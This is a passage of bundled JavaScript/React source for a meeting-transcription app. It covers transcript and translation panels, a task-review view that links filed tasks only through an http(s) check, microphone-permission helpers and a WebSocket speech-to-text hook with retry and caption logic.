		restoreStateFrom: "restoreStateFrom",
		initialTopMostItemIndex: "initialTopMostItemIndex",
		increaseViewportBy: "increaseViewportBy"
	},
	methods: {
		scrollTo: "scrollTo",
		scrollBy: "scrollBy",
		scrollToIndex: "scrollToIndex"
	},
	events: {
		isScrolling: "isScrolling",
		endReached: "endReached",
		startReached: "startReached",
		rangeChanged: "rangeChanged",
		atBottomStateChange: "atBottomStateChange",
		atTopStateChange: "atTopStateChange",
		stateChanged: "stateChanged",
		readyStateChanged: "readyStateChanged"
	}
}, /* @__PURE__ */ H.memo(function({ ...e }) {
	const n = st("useWindowScroll"), o = st("customScrollParent"), r = o || n ? Dr : Nr, s = o || n ? Ar : Gr, i = st("context");
	return /* @__PURE__ */ jsx(r, {
		...e,
		...nt(r, i),
		children: /* @__PURE__ */ jsxs(s, { children: [
			/* @__PURE__ */ jsx(Pr, {}),
			/* @__PURE__ */ jsx(Vr, {}),
			/* @__PURE__ */ jsx(Wr, {})
		] })
	});
})), Nr = /* @__PURE__ */ Je({
	useEmitter: lo,
	useEmitterValue: st,
	usePublisher: wt
}), Dr = /* @__PURE__ */ Qe({
	useEmitter: lo,
	useEmitterValue: st,
	usePublisher: wt
});
function On(t, e, n) {
	return e !== "normal" && e?.endsWith("px") !== !0 && n(`${t} was not resolved to pixel value correctly`, e, ft.WARN), e === "normal" ? 0 : parseInt(e ?? "0", 10);
}
// src/components/TranscriptPanel.tsx
var FOLLOW_THRESHOLD_PX = 48;
var VIRTUALIZE_AFTER_SEGMENTS = 200;
var VirtualItem = forwardRef(function VirtualItem({ context: _context, ...props }, ref) {
	const className = `${props.className ?? ""} pb-3`.trim();
	return /* @__PURE__ */ jsx("div", {
		...props,
		ref,
		role: "listitem",
		className
	});
});
function VirtualFooter({ context }) {
	return context.partial ? /* @__PURE__ */ jsx(PartialRow, {
		text: context.partial,
		className: "pb-3"
	}) : null;
}
var VIRTUAL_COMPONENTS = {
	Footer: VirtualFooter,
	Item: VirtualItem,
	List: forwardRef(function VirtualList({ context, ...props }, ref) {
		const className = `${props.className ?? ""} px-4 pt-3 ${context.primary ? "w-full max-w-3xl mx-auto" : ""}`.trim();
		return /* @__PURE__ */ jsx("div", {
			...props,
			ref,
			role: "list",
			className
		});
	})
};
function TranscriptRow({ segment }) {
	const typed = segment.source === "typed";
	return /* @__PURE__ */ jsxs("div", {
		className: "grid grid-cols-[auto_minmax(0,1fr)] gap-2.5",
		children: [/* @__PURE__ */ jsx("time", {
			dateTime: segment.timestamp,
			className: "text-[11px] tabular-nums text-muted pt-0.5",
			children: fmtTime(segment.timestamp)
		}), /* @__PURE__ */ jsxs("div", {
			className: "min-w-0",
			children: [typed ? /* @__PURE__ */ jsxs("span", {
				className: "inline-flex items-center gap-1 text-[11px] text-muted mb-0.5",
				children: [/* @__PURE__ */ jsx(MessageSquareText, { className: "lucide-inline" }), i18nT("apps.meetings.transcript.typed")]
			}) : null, /* @__PURE__ */ jsx("p", {
				className: "text-[13px] leading-5 text-text whitespace-pre-wrap break-words",
				children: segment.text
			})]
		})]
	});
}
function PartialRow({ text, className = "" }) {
	return /* @__PURE__ */ jsxs("div", {
		className: `grid grid-cols-[auto_minmax(0,1fr)] gap-2.5 text-muted ${className}`,
		children: [/* @__PURE__ */ jsx("span", {
			className: "text-[11px] pt-0.5",
			children: i18nT("apps.meetings.transcript.live")
		}), /* @__PURE__ */ jsx("p", {
			className: "text-[13px] leading-5 italic break-words",
			children: text
		})]
	});
}
function TranscriptPanel({ segments, partial = "", primary = false, status = "active", resuming = false, full = false }) {
	const scrollerRef = useRef(null);
	const virtuosoRef = useRef(null);
	const [following, setFollowing] = useState(true);
	const virtualized = segments.length > VIRTUALIZE_AFTER_SEGMENTS;
	const visiblePartial = full ? "" : partial;
	const virtualContext = useMemo(() => ({
		partial: visiblePartial,
		primary
	}), [primary, visiblePartial]);
	const latestDurableSegment = segments.at(-1);
	const scrollToLatest = useCallback((behavior = "smooth") => {
		if (virtualized) {
			virtuosoRef.current?.scrollTo({
				top: Number.MAX_SAFE_INTEGER,
				behavior
			});
			return;
		}
		const scroller = scrollerRef.current;
		if (!scroller) return;
		scroller.scrollTo({
			top: scroller.scrollHeight,
			behavior
		});
	}, [virtualized]);
	useEffect(() => {
		if (!following) return;
		const frame = window.requestAnimationFrame(() => scrollToLatest("auto"));
		return () => window.cancelAnimationFrame(frame);
	}, [
		following,
		scrollToLatest,
		segments.length,
		visiblePartial
	]);
	const onScroll = () => {
		const scroller = scrollerRef.current;
		if (!scroller) return;
		const distance = scroller.scrollHeight - scroller.scrollTop - scroller.clientHeight;
		setFollowing(distance <= FOLLOW_THRESHOLD_PX);
	};
	const emptyHintKey = full ? "apps.meetings.transcript.emptyHintRecorded" : status === "active" || resuming ? "apps.meetings.transcript.emptyHintLive" : status === "paused" ? "apps.meetings.transcript.emptyHintPaused" : "apps.meetings.transcript.emptyHintRecorded";
	return /* @__PURE__ */ jsxs("section", {
		"aria-label": i18nT("apps.meetings.transcript.regionLabel"),
		className: "relative h-full min-h-0 rounded-xl border border-border bg-card overflow-hidden flex flex-col shadow-sm",
		children: [
			/* @__PURE__ */ jsx("p", {
				className: "sr-only",
				"aria-live": "polite",
				"aria-atomic": "true",
				children: latestDurableSegment?.text ?? ""
			}),
			/* @__PURE__ */ jsxs("header", {
				className: "flex-none flex items-center gap-2.5 px-4 py-3 border-b border-border bg-bg-elevated/40",
				children: [/* @__PURE__ */ jsx(ScrollText, { className: "lucide-inline text-accent" }), /* @__PURE__ */ jsx("h3", {
					className: "text-sm font-semibold text-text-strong",
					children: i18nT("apps.meetings.transcript.title")
				})]
			}),
			full ? /* @__PURE__ */ jsx(ui_default$2, {
				className: "flex-none mx-4 mt-3",
				message: i18nT("apps.meetings.transcript.full")
			}) : null,
			primary ? /* @__PURE__ */ jsxs("div", {
				className: "flex-none mx-4 mt-3 rounded-lg border border-border bg-bg-elevated/40 px-3 py-2",
				children: [/* @__PURE__ */ jsx("p", {
					className: "text-[12px] font-medium text-text-strong",
					children: i18nT("apps.meetings.meeting.noAgents")
				}), /* @__PURE__ */ jsx("p", {
					className: "text-[12px] text-muted mt-0.5",
					children: i18nT("apps.meetings.meeting.noAgentsHint")
				})]
			}) : null,
			segments.length === 0 && !visiblePartial ? /* @__PURE__ */ jsxs("div", {
				className: "flex-1 min-h-[180px] flex flex-col items-center justify-center text-center px-5",
				children: [
					/* @__PURE__ */ jsx(ScrollText, { className: "lucide-inline text-muted mb-3" }),
					/* @__PURE__ */ jsx("p", {
						className: "text-sm font-medium text-text-strong",
						children: i18nT("apps.meetings.transcript.empty")
					}),
					/* @__PURE__ */ jsx("p", {
						className: "text-[13px] text-muted mt-1 max-w-sm",
						children: i18nT(emptyHintKey)
					})
				]
			}) : virtualized ? /* @__PURE__ */ jsx(qr, {
				ref: virtuosoRef,
				className: "flex-1 min-h-0",
				data: segments,
				context: virtualContext,
				components: VIRTUAL_COMPONENTS,
				computeItemKey: (_index, segment) => segment.id,
				itemContent: (_index, segment) => /* @__PURE__ */ jsx(TranscriptRow, { segment }),
				atBottomThreshold: FOLLOW_THRESHOLD_PX,
				atBottomStateChange: setFollowing,
				followOutput: following ? "auto" : false
			}) : /* @__PURE__ */ jsx("div", {
				ref: scrollerRef,
				onScroll,
				className: "flex-1 min-h-0 overflow-y-auto px-4 py-3",
				children: /* @__PURE__ */ jsxs("ol", {
					className: `flex flex-col gap-3 ${primary ? "w-full max-w-3xl mx-auto" : ""}`,
					children: [segments.map((segment) => /* @__PURE__ */ jsx("li", { children: /* @__PURE__ */ jsx(TranscriptRow, { segment }) }, segment.id)), visiblePartial ? /* @__PURE__ */ jsx("li", { children: /* @__PURE__ */ jsx(PartialRow, { text: visiblePartial }) }) : null]
				})
			}),
			!following ? /* @__PURE__ */ jsxs(Btn$1, {
				className: "absolute right-4 bottom-4 shadow-md",
				onClick: () => {
					setFollowing(true);
					scrollToLatest();
				},
				children: [/* @__PURE__ */ jsx(ArrowDownToLine, { className: "lucide-inline" }), i18nT("apps.meetings.transcript.jumpToLatest")]
			}) : null
		]
	});
}
// src/components/TranslationSidebar.tsx
function TranslationSidebar({ lines, languageLabel, pending, dropped, loading, onClose }) {
	const endRef = useRef(null);
	const lastN = lines.length > 0 ? lines[lines.length - 1].n : -1;
	useEffect(() => {
		endRef.current?.scrollIntoView({ block: "end" });
	}, [lastN]);
	return /* @__PURE__ */ jsxs("aside", {
		className: "flex-none w-full h-[42%] min-h-[260px] border-t border-border lg:h-full lg:w-[340px] lg:border-t-0 lg:border-l bg-bg flex flex-col overflow-hidden",
		"aria-label": i18nT("apps.meetings.translation.title"),
		children: [
			/* @__PURE__ */ jsxs("div", {
				className: "flex-none px-3 py-2.5 border-b border-border flex items-center justify-between gap-2",
				children: [/* @__PURE__ */ jsxs("div", {
					className: "flex items-center gap-2 min-w-0",
					children: [
						/* @__PURE__ */ jsx(Languages, { className: "lucide-inline text-muted" }),
						/* @__PURE__ */ jsx("span", {
							className: "text-[13px] font-semibold text-text-strong truncate",
							children: i18nT("apps.meetings.translation.title")
						}),
						/* @__PURE__ */ jsx(Badge, {
							variant: "muted",
							children: languageLabel
						})
					]
				}), /* @__PURE__ */ jsx(Btn$1, {
					onClick: onClose,
					"aria-label": i18nT("apps.meetings.translation.close"),
					children: /* @__PURE__ */ jsx(X, { className: "lucide-inline" })
				})]
			}),
			/* @__PURE__ */ jsxs("div", {
				className: "flex-1 overflow-y-auto p-3 flex flex-col gap-3",
				children: [lines.length === 0 ? /* @__PURE__ */ jsx(EmptyState, {
					icon: /* @__PURE__ */ jsx(Languages, { className: "lucide-inline" }),
					title: i18nT("apps.meetings.translation.empty"),
					subtitle: loading ? i18nT("apps.meetings.translation.loading") : i18nT("apps.meetings.translation.emptyHint")
				}) : lines.map((line) => /* @__PURE__ */ jsxs("div", {
					className: "flex flex-col gap-1",
					children: [/* @__PURE__ */ jsx("p", {
						className: "text-[12px] text-muted leading-snug",
						children: line.source
					}), line.text ? /* @__PURE__ */ jsx("p", {
						className: "text-[13px] text-text leading-snug",
						children: line.text
					}) : /* @__PURE__ */ jsx("p", {
						className: "text-[13px] text-muted italic leading-snug",
						children: i18nT("apps.meetings.translation.lineFailed")
					})]
				}, line.n)), /* @__PURE__ */ jsx("div", { ref: endRef })]
			}),
			(pending > 0 || dropped > 0) && /* @__PURE__ */ jsxs("div", {
				className: "flex-none px-3 py-2 border-t border-border text-[12px] text-muted flex items-center justify-between gap-2",
				children: [/* @__PURE__ */ jsx("span", { children: pending > 0 ? i18nT("apps.meetings.translation.pending") : "" }), dropped > 0 && /* @__PURE__ */ jsx("span", {
					className: "text-danger",
					children: i18nT("apps.meetings.translation.dropped")
				})]
			})
		]
	});
}
// src/TaskReviewView.tsx
/**
* Whether a filed-task reference URL is safe to put in an `href`.
*
* `filed_ref` comes out of `tasks.json`, which an agent writes — so the URL is
* model-supplied, and a `javascript:` value would execute on the dashboard
* origin when the user clicks the link (React 18 only warns; the dashboard CSP
* allows inline script). Only absolute http(s) is rendered as a link; anything
* else falls back to the plain-text id below.
*/
function linkableUrl(ref) {
	const url = ref?.url;
	return url && /^https?:\/\//i.test(url) ? url : null;
}
function TaskReviewView({ tasks, transcript, partialTranscript, transcriptFull, provider, filing, filingIds = [], onBack, onClose, onFile, onArchive, onUnarchive }) {
	const pending = tasks.filter((task) => task.review_status === "pending");
	const archived = tasks.filter((task) => task.review_status === "archived");
	const filed = tasks.filter((task) => task.review_status === "pushed");
	const canClose = pending.length === 0;
	const inFlight = new Set(filingIds);
	if (filing) inFlight.add(filing);
	const archivable = pending.filter((task) => !inFlight.has(task.id));
	const skipsFiling = archivable.length < pending.length;
	const skipsId = useId();
	return /* @__PURE__ */ jsxs("div", {
		className: "flex flex-col lg:flex-row h-full overflow-hidden",
		children: [/* @__PURE__ */ jsxs("div", {
			className: "flex flex-col flex-1 min-w-0 min-h-0 overflow-hidden",
			children: [
				/* @__PURE__ */ jsxs("div", {
					className: "flex-none px-4 md:px-6 py-4 border-b border-border flex items-center gap-3",
					children: [
						/* @__PURE__ */ jsx(Btn$1, {
							onClick: onBack,
							children: i18nT("apps.meetings.review.backToMeeting")
						}),
						/* @__PURE__ */ jsx("h2", {
							className: "text-lg font-semibold text-text-strong",
							children: i18nT("apps.meetings.review.title")
						}),
						/* @__PURE__ */ jsx(Badge, {
							variant: canClose ? "ok" : "warn",
							children: canClose ? i18nT("apps.meetings.review.allDone") : i18nT("apps.meetings.review.remaining", { count: pending.length })
						}),
						pending.length > 0 && /* @__PURE__ */ jsxs("div", {
							className: "ml-auto flex items-center gap-2",
							children: [skipsFiling && /* @__PURE__ */ jsx("span", {
								id: skipsId,
								className: "text-[12px] text-muted",
								children: i18nT("apps.meetings.review.archiveSkipsFiling")
							}), /* @__PURE__ */ jsxs(Btn$1, {
								onClick: () => archivable.forEach((task) => onArchive(task.id)),
								disabled: archivable.length === 0,
								"aria-describedby": skipsFiling ? skipsId : void 0,
								children: [/* @__PURE__ */ jsx(Archive, { className: "lucide-inline" }), skipsFiling && archivable.length > 0 ? i18nT("apps.meetings.review.archiveOthers", { count: archivable.length }) : i18nT("apps.meetings.review.archiveAll")]
							})]
						})
					]
				}),
				/* @__PURE__ */ jsxs("div", {
					className: "px-4 md:px-6 pb-8 overflow-y-auto flex-1 min-h-0",
					children: [
						/* @__PURE__ */ jsxs("div", {
							className: "grid gap-3.5 grid-cols-[repeat(auto-fit,minmax(150px,1fr))] my-6",
							children: [
								/* @__PURE__ */ jsx(StatCard, {
									label: i18nT("apps.meetings.review.statPending"),
									value: pending.length,
									accent: true
								}),
								/* @__PURE__ */ jsx(StatCard, {
									label: i18nT("apps.meetings.review.statFiled"),
									value: filed.length
								}),
								/* @__PURE__ */ jsx(StatCard, {
									label: i18nT("apps.meetings.review.statArchived"),
									value: archived.length
								})
							]
						}),
						/* @__PURE__ */ jsxs(Card, { children: [/* @__PURE__ */ jsx(CardTitle, { children: i18nT("apps.meetings.review.pendingSection") }), pending.length === 0 ? /* @__PURE__ */ jsx(EmptyState, {
							icon: /* @__PURE__ */ jsx(CircleCheck, { className: "lucide-inline" }),
							title: i18nT("apps.meetings.review.nothingPending"),
							subtitle: i18nT("apps.meetings.review.nothingPendingHint")
						}) : /* @__PURE__ */ jsx("div", {
							className: "flex flex-col gap-2 mt-2",
							children: pending.map((task) => /* @__PURE__ */ jsxs("div", {
								className: "flex items-center gap-3 px-4 py-3 border border-border rounded-md",
								children: [
									/* @__PURE__ */ jsxs("div", {
										className: "flex-1 min-w-0",
										children: [/* @__PURE__ */ jsx("p", {
											className: "text-sm text-text font-medium break-words",
											children: task.description
										}), /* @__PURE__ */ jsxs("div", {
											className: "flex items-center gap-2 mt-1",
											children: [task.assignee && /* @__PURE__ */ jsx("span", {
												className: "text-[12px] text-muted",
												children: i18nT("apps.meetings.review.assignedTo", { name: task.assignee })
											}), /* @__PURE__ */ jsx(Badge, {
												variant: task.priority === "high" ? "err" : "muted",
												children: i18nT(PRIORITY_LABEL_KEY[task.priority])
											})]
										})]
									}),
									/* @__PURE__ */ jsxs(Btn$1, {
										onClick: () => onArchive(task.id),
										disabled: inFlight.has(task.id),
										"aria-label": i18nT("apps.meetings.review.archive"),
										children: [/* @__PURE__ */ jsx(Archive, { className: "lucide-inline" }), i18nT("apps.meetings.review.archive")]
									}),
									/* @__PURE__ */ jsxs(SendBtn, {
										onClick: () => onFile(task.id),
										disabled: inFlight.has(task.id),
										"aria-label": i18nT("apps.meetings.review.file"),
										children: [/* @__PURE__ */ jsx(Send, { className: "lucide-inline" }), inFlight.has(task.id) ? i18nT("apps.meetings.review.filing") : i18nT("apps.meetings.review.file")]
									})
								]
							}, task.id))
						})] }),
						filed.length > 0 && /* @__PURE__ */ jsxs(Card, {
							className: "mt-4",
							children: [/* @__PURE__ */ jsx(CardTitle, { children: i18nT("apps.meetings.review.filedSection", { provider }) }), /* @__PURE__ */ jsx("div", {
								className: "flex flex-col gap-2 mt-2",
								children: filed.map((task) => {
									const href = linkableUrl(task.filed_ref);
									return /* @__PURE__ */ jsxs("div", {
										className: "flex items-center gap-3 px-4 py-2.5 border border-ok/30 rounded-md bg-ok-subtle",
										children: [
											/* @__PURE__ */ jsx(CircleCheck, { className: "lucide-inline text-ok" }),
											/* @__PURE__ */ jsx("p", {
												className: "flex-1 min-w-0 text-[13px] text-text truncate",
												children: task.description
											}),
											href ? /* @__PURE__ */ jsxs("a", {
												href,
												target: "_blank",
												rel: "noopener noreferrer",
												className: "text-accent hover:underline inline-flex items-center gap-1 text-[12px]",
												children: [/* @__PURE__ */ jsx(ExternalLink, { className: "lucide-inline" }), task.filed_ref?.id]
											}) : task.filed_ref?.id && /* @__PURE__ */ jsx("span", {
												className: "text-[12px] text-muted font-mono",
												children: task.filed_ref.id
											})
										]
									}, task.id);
								})
							})]
						}),
						archived.length > 0 && /* @__PURE__ */ jsxs(Card, {
							className: "mt-4",
							children: [/* @__PURE__ */ jsx(CardTitle, { children: i18nT("apps.meetings.review.archivedSection") }), /* @__PURE__ */ jsx("div", {
								className: "flex flex-col gap-2 mt-2",
								children: archived.map((task) => /* @__PURE__ */ jsxs("div", {
									className: "flex items-center gap-3 px-4 py-2.5 border border-border rounded-md opacity-60",
									children: [/* @__PURE__ */ jsx("p", {
										className: "flex-1 min-w-0 text-[13px] text-muted line-through truncate",
										children: task.description
									}), /* @__PURE__ */ jsxs(Btn$1, {
										onClick: () => onUnarchive(task.id),
										"aria-label": i18nT("apps.meetings.review.unarchive"),
										children: [/* @__PURE__ */ jsx(ArchiveRestore, { className: "lucide-inline" }), i18nT("apps.meetings.review.unarchive")]
									})]
								}, task.id))
							})]
						})
					]
				}),
				/* @__PURE__ */ jsx("div", {
					className: "flex-none px-4 md:px-6 py-4 border-t border-border flex justify-center",
					children: /* @__PURE__ */ jsxs(SendBtn, {
						onClick: onClose,
						disabled: !canClose,
						"aria-label": i18nT("apps.meetings.review.closeMeeting"),
						children: [/* @__PURE__ */ jsx(CheckCheck, { className: "lucide-inline" }), canClose ? i18nT("apps.meetings.review.closeMeeting") : i18nT("apps.meetings.review.closeBlocked", { count: pending.length })]
					})
				})
			]
		}), /* @__PURE__ */ jsx("div", {
			className: "flex-none h-[38%] min-h-[260px] p-4 pt-0 lg:h-full lg:w-[360px] lg:pl-0 lg:pt-4",
			children: /* @__PURE__ */ jsx(TranscriptPanel, {
				segments: transcript,
				partial: partialTranscript,
				status: "reviewing",
				full: transcriptFull
			})
		})]
	});
}
// src/hooks/useExpandedAgent.ts
function useExpandedAgent(enabledIds) {
	const [chosen, setChosen] = useState(null);
	const present = chosen !== null && enabledIds.includes(chosen);
	useEffect(() => {
		if (chosen !== null && !present) setChosen(null);
	}, [chosen, present]);
	const toggle = useCallback((agentId) => setChosen((current) => current === agentId ? null : agentId), []);
	return {
		expandedId: present ? chosen : null,
		toggle
	};
}
// src/host/mic.ts
/**
* The one microphone helper the transcription hook used from the dashboard's
* `hooks/mic.ts`, restated: report a permission denial to the desktop shell so it
* can show the OS privacy pane (macOS asks for the microphone once). A no-op in a
* plain browser, and best-effort everywhere: telling the user why must never be
* what throws. The shell bridge is not an App Kit seam (PORTING.md, "UI gaps").
*/
function reportMicDenied() {
	try {
		window.electronAPI?.reportMicDenied?.();
	} catch {}
}
/** True when a getUserMedia rejection means "the user/OS refused", not "no device". */
function isPermissionDenial(e) {
	const name = e?.name || "";
	return name === "NotAllowedError" || name === "SecurityError";
}
/** Report a mic failure to the shell when, and only when, it was a denial. */
function reportIfMicDenied(e) {
	if (isPermissionDenial(e)) reportMicDenied();
}
// src/host/dictationText.ts
var CLOSING_ASCII_PUNCTUATION = /^[,.;:!?)}\]]/u;
/** Preserve authored whitespace and keep unspaced scripts continuous, while
* preventing independently recognized Latin words from being glued together. */
function dictationSeparator(before, after) {
	if (!before || !after || /\s$/u.test(before) || /^\s/u.test(after)) return "";
	if (CLOSING_ASCII_PUNCTUATION.test(after)) return "";
	if (/[\p{Script=Han}\p{Script=Hiragana}\p{Script=Katakana}]$/u.test(before) || /^[\p{Script=Han}\p{Script=Hiragana}\p{Script=Katakana}，。！？、；：]/u.test(after)) return "";
	return " ";
}
function joinTranscript(parts) {
	return parts.map((part) => part.trim()).filter(Boolean).reduce((all, part) => all + dictationSeparator(all, part) + part, "");
}
/** A bounded recent caption, preserving unspaced scripts at the cut. Only a
* partial word in a spaced script is advanced to the next transcript boundary. */
function transcriptTail(text, maxChars) {
	if (maxChars <= 0) return "";
	let start = Math.max(0, text.length - maxChars);
	if (start > 0 && /[\uDC00-\uDFFF]/u.test(text[start])) start++;
	const tail = text.slice(start);
	if (!start || !CLOSING_ASCII_PUNCTUATION.test(tail) && !dictationSeparator(text.slice(0, start), tail)) return tail.trimStart();
	const characters = Array.from(tail);
	for (let i = 1; i < characters.length; i++) if (!CLOSING_ASCII_PUNCTUATION.test(characters[i]) && !dictationSeparator(characters[i - 1], characters[i])) return characters.slice(i).join("").trimStart();
	return tail;
}
var PCM_WORKLET_URL = new URL("../pcm-worklet.js", import.meta.url).href;
/** Feature detection mirroring `useStreamingStt` — the dashboard's own hook. */
var transcriptionSupported = typeof window !== "undefined" && typeof window.AudioContext !== "undefined" && typeof window.AudioWorkletNode !== "undefined" && typeof window.WebSocket !== "undefined" && typeof navigator !== "undefined" && typeof navigator.mediaDevices !== "undefined" && typeof navigator.mediaDevices.getUserMedia === "function";
/** Cap the locally buffered pre-`ready` audio at ~8s (16 kHz mono Int16 = 32 KB/s). */
/** The stop frame the STT WebSocket protocol expects (a wire frame, not copy). */
var STOP_FRAME = JSON.stringify({ type: "stop" });
/**
* Server error codes that a reconnect cannot fix: a setting, a consent or a
* package must change first. After one of these the hook halts instead of
* reopening the socket (see `halted`). Every other code is retried.
*/
var TERMINAL_ERROR_CODES = /* @__PURE__ */ new Set([
	"stt_streaming_disabled",
	"stt_consent_required",
	"stt_aws_access_denied",
	"stt_extra_missing",
	"stt_transcribe_vocabulary_rejected",
	"stt_transcribe_sdk_outdated"
]);
var MAX_BUFFERED_BYTES = 262144;
/** Reconnect when no server frame has arrived for this long while recording. */
var STALL_TIMEOUT_MS = 2e4;
var WATCHDOG_INTERVAL_MS = 5e3;
/** How long to wait for the server to close after `stop` before forcing it. */
var CLOSE_GRACE_MS = 8e3;
/**
* Retry schedule for a failed segment dispatch, in ms.
*
* A dispatch is the ONLY path a final segment reaches the agents, so a swallowed
* rejection means the notes and tasks silently omit that stretch of the meeting —
* the same "a queue is discarded without being drained" failure the backend
* teardown paths were fixed for, reached from the client side. A transient
* failure (a gateway restart, a momentary network drop) is exactly the case worth
* retrying, and the segment is small.
*
* Bounded and short on purpose: transcription is a live stream, so a segment that
* cannot land within a few seconds is better dropped than queued indefinitely
* behind newer speech. The give-up is REPORTED (see below) rather than silent,
* which is the part that was actually missing.
*/
var DISPATCH_RETRY_DELAYS_MS = [
	400,
	1200,
	3e3
];
/**
* The recent tail of the transcript, for the "Heard: …" caption.
*
* Trimming from the FRONT is the entire point. The finals array accumulates for
* the whole meeting, and the caption used to receive all of it — which read as a
* caption that froze on the meeting's opening sentence and never updated again,
* because the element clipped its overflow with `text-overflow: ellipsis` and
* that shows a string's HEAD. A live caption has to show the newest speech, so
* the oldest is what gets dropped.
*
* Whole segments are kept wherever possible so the caption never begins
* mid-sentence; only a single over-long segment is cut, and then at a word
* boundary.
*/
function captionWindow(finals, partial = "") {
	const segments = [...finals, partial].map((s) => s.trim()).filter(Boolean);
	if (segments.length === 0) return "";
	const kept = [];
	let length = 0;
	for (let i = segments.length - 1; i >= 0; i--) {
		const cost = segments[i].length + dictationSeparator(segments[i], kept[0] ?? "").length;
		if (length + cost > 240) break;
		kept.unshift(segments[i]);
		length += cost;
	}
	if (kept.length > 0) return joinTranscript(kept);
	return transcriptTail(segments[segments.length - 1], 240);
}
function useMeetingTranscription({ meetingId, onCaption, onFinal, onPartial, onCommitted, onError }) {
	const [active, setActive] = useState(false);
	/**
	* True from when the worklet is ready and start() is awaiting the server's
	* 'ready' frame, until the frame arrives (or cleanup runs).
	*
	* The session effect uses this to stop the mic if the meeting is paused during
	* the connect phase. Without it, pausing between the worklet loading and 'ready'
	* arriving leaves active=false so the effect never calls stop(), and the buffered
	* PCM is flushed once 'ready' arrives — dispatching audio from the paused window.
	*/
	const [connecting, setConnecting] = useState(false);
	/**
	* True after the server sent a TERMINAL error frame (`TERMINAL_ERROR_CODES`),
	* until `stop()` runs. While set, `start()` refuses, so a refusal (streaming
	* disabled, no grant) cannot turn into a reconnect loop, whatever order the
	* error frame, the socket close and the caller's effect re-run arrive in.
	*/
	const [halted, setHalted] = useState(false);
	const haltedRef = useRef(false);
	const wsRef = useRef(null);
	const ctxRef = useRef(null);
	const streamRef = useRef(null);
	const watchdogRef = useRef(null);
	const lastFrameRef = useRef(0);
	const finalsRef = useRef([]);
	const stoppingRef = useRef(false);
	const dispatchBlockedRef = useRef(false);
	/** True from entering `start()` until the socket is live (or it gave up). */
	const startingRef = useRef(false);
	/**
	* Bumped by every `cleanup()`. A `start()` remembers the value it began under,
	* so after awaiting the microphone it can tell that a stop or an unmount tore
	* the session down while the permission prompt was open.
	*/
	const teardownRef = useRef(0);
	const onCaptionRef = useRef(onCaption);
	const onFinalRef = useRef(onFinal);
	const onPartialRef = useRef(onPartial);
	const onCommittedRef = useRef(onCommitted);
	const onErrorRef = useRef(onError);
	onCaptionRef.current = onCaption;
	onFinalRef.current = onFinal;
	onPartialRef.current = onPartial;
	onCommittedRef.current = onCommitted;
	onErrorRef.current = onError;
	useEffect(() => {
		dispatchBlockedRef.current = false;
	}, [meetingId]);
	/**
	* Send one final segment to the agents, retrying a transient failure.
	*
	* Never rejects: a dispatch failure must not tear down the socket handler that
	* called it. But it must not be silent either — if every attempt fails the
	* segment is genuinely lost from the notes and tasks, so the caller's error
	* channel is told, which is what surfaces a toast instead of a quiet gap.
	*
	* Not cancelled on stop(): a segment captured before the user paused still
	* belongs in the transcript, and the endpoint is idempotent per segment.
	*/
	const dispatchWithRetry = useCallback(async (text) => {
		if (dispatchBlockedRef.current) return;
		for (let attempt = 0;; attempt += 1) try {
			const response = await meetingsApi.dispatch(meetingId, text);
			onCommittedRef.current?.(response.segment);
			return;
		} catch (error) {
			if (error instanceof MeetingsApiError && error.status === 413 && error.code === "transcript_too_large") {
				dispatchBlockedRef.current = true;
				onPartialRef.current?.("");
				onErrorRef.current?.("transcript_full");
				return;
			}
			if (!(error instanceof MeetingsApiError) || attempt >= DISPATCH_RETRY_DELAYS_MS.length) {
				onErrorRef.current?.("dispatch");
				return;
			}
			await new Promise((resolve) => setTimeout(resolve, DISPATCH_RETRY_DELAYS_MS[attempt]));
		}
	}, [meetingId]);
	const clearWatchdog = useCallback(() => {
		if (watchdogRef.current) {
			clearInterval(watchdogRef.current);
			watchdogRef.current = null;
		}
	}, []);
	const cleanup = useCallback(() => {
		teardownRef.current += 1;
		clearWatchdog();
		try {
			wsRef.current?.close();
		} catch {}
		wsRef.current = null;
		try {
			streamRef.current?.getTracks().forEach((t) => t.stop());
		} catch {}
		streamRef.current = null;
		try {
			ctxRef.current?.close();
		} catch {}
		ctxRef.current = null;
		startingRef.current = false;
		onPartialRef.current?.("");
		setActive(false);
		setConnecting(false);
	}, [clearWatchdog]);
	useEffect(() => () => {
		cleanup();
	}, [cleanup]);
	const start = useCallback(async () => {
		if (!transcriptionSupported) {
			onErrorRef.current?.("unsupported");
			return;
		}
		if (wsRef.current) return;
		if (haltedRef.current) return;
		if (startingRef.current) return;
		startingRef.current = true;
		stoppingRef.current = false;
		finalsRef.current = [];
		const teardown = teardownRef.current;
		let stream;
		try {
			stream = await navigator.mediaDevices.getUserMedia({ audio: true });
		} catch (e) {
			if (teardownRef.current !== teardown) return;
			reportIfMicDenied(e);
			onErrorRef.current?.("microphone");
			startingRef.current = false;
			return;
		}
		if (teardownRef.current !== teardown) {
			try {
				stream.getTracks().forEach((t) => t.stop());
			} catch {}
			return;
		}
		streamRef.current = stream;
		const proto = window.location.protocol === "https:" ? "wss:" : "ws:";
		const ws = new WebSocket(`${proto}//${window.location.host}/api/ws/stt`);
		ws.binaryType = "arraybuffer";
		wsRef.current = ws;
		let resolveReady = () => {};
		const readyPromise = new Promise((resolve) => {
			resolveReady = resolve;
		});
		let lastPartial = "";
		ws.onmessage = (ev) => {
			if (typeof ev.data !== "string") return;
			lastFrameRef.current = Date.now();
			let msg;
			try {
				msg = JSON.parse(ev.data);
			} catch {
				return;
			}
			if (msg.type === "ready") {
				resolveReady();
				return;
			}
			if (msg.type === "partial") {
				lastPartial = msg.text || "";
				onPartialRef.current?.(lastPartial);
				onCaptionRef.current(captionWindow(finalsRef.current, lastPartial));
				return;
			}
			if (msg.type === "final") {
				const text = (msg.text || "").trim();
				lastPartial = "";
				onPartialRef.current?.("");
				if (!text) return;
				finalsRef.current.push(text);
				if (finalsRef.current.length > 64) finalsRef.current.splice(0, finalsRef.current.length - 64);
				onCaptionRef.current(captionWindow(finalsRef.current));
				const decision = onFinalRef.current?.(text);
				if (decision === false) return;
				const toDispatch = typeof decision === "string" ? decision : text;
				if (!toDispatch.trim()) return;
				dispatchWithRetry(toDispatch);
				return;
			}
			if (msg.type === "error") {
				onErrorRef.current?.(msg.code || msg.message || "error");
				stoppingRef.current = true;
				if (msg.code && TERMINAL_ERROR_CODES.has(msg.code)) {
					setConnecting(false);
					haltedRef.current = true;
					setHalted(true);
				}
				resolveReady();
			}
		};
		ws.onclose = () => {
			resolveReady();
			if (wsRef.current !== ws) return;
			if (!stoppingRef.current) onErrorRef.current?.("disconnected");
			cleanup();
		};
		try {
			await new Promise((resolve, reject) => {
